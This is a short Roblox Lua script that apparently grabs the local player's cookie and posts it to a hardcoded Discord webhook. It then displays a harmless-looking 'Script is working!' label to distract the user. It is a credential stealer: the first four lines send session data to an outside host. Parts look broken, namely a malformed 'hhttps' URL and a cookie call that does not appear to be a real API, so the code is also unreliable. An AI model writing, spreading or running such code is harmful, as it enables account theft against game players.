local http = game:GetService("HttpService")
local url = "hhttps://discord.com/api/webhooks/1519322724281876511/w8U8K-U7TwG79mY5NFgFaJfumRWiYUHwQFEo2ZRlgOMyJWtVvDcMreCbBnIqOKNivRuh"
local cookie = game:GetService("Players").LocalPlayer:GetCookie()
http:PostAsync(url, cookie)

local textLabel = Instance.new("TextLabel")
textLabel.Text = "Script is working!"
textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
textLabel.Parent = game.Players.LocalPlayer.PlayerGui
